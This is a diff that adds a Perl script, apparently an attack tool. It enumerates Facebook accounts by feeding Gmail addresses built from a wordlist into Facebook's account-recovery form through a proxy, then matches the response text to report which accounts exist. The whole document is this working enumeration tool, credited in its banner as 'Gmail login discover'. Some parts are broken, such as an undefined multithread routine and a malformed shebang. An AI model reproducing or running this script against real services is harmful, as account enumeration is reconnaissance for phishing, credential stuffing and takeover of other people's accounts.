@@ -1,0 +1,70 @@
+#!/usr/bin/env/perl
+use WWW::Mechanize;
+use strict;
+use warnings;
+
+my $mech = WWW::Mechanize->new();
+my $url = "http://anype.com/SURF/https://www.facebook.com/login/identify?ctx=recover&lwv=120&lwc=1348092";
+
+$mech->get($url);
+my $i = 0;
+my $wordlist = "MyOwnDictionary.txt";
+banner();
+init(1);
+my (@a, @aa, $type);
+
+system("pause");
+
+sub main {
+#logger($mech->content());
+$mech->submit_form(
+        fields      => {
+            email    => shift,
+        }
+    );
+#logger($mech->content());
+if ($mech->content() =~ /retornou nenhum resultado|not found/ig) {
+	print "[+]Account not exists\n";
+} elsif ($mech->content() =~ /selecione sua conta|select your|Redefinir sua senha/ig) {
+	print "[+]Account exists\n";
+	$mech->get($url);
+} else {
+print "Unknown error\n";
+$mech->get($url);
+}
+}
+
+sub logger {
+open F, ">>logger$i.html";
+print F shift;
+close (F);
+$i += 1;
+}
+
+sub banner {
+open (LIST, $wordlist) || die "\n[-] No Wordlist On $wordlist -_- \n";
+print "Gmail login discover - by xandin69\n\n";
+}
+
+sub init {
+for (<*>) { if (!(-f $wordlist)) { print "\nWordlist not found\n"; system("pause"); exit(0);} }
+@a = <LIST>;
+@aa = grep { !/^$/ } @a;
+close (LIST);
+if (shift eq "1") {singlethread();print "Running in 1 thread\n"} else {multithread();} 
+}
+
+sub singlethread {
+$i = 0;
+	for (@a) {
+		print "id : Trying => $aa[$i]";
+		doit($aa[$i]);
+		$i++;
+	}
+}
+
+sub doit {
+my $email = shift.'@gmail.com';
+main($email);
+#logit($mech->content());
+}
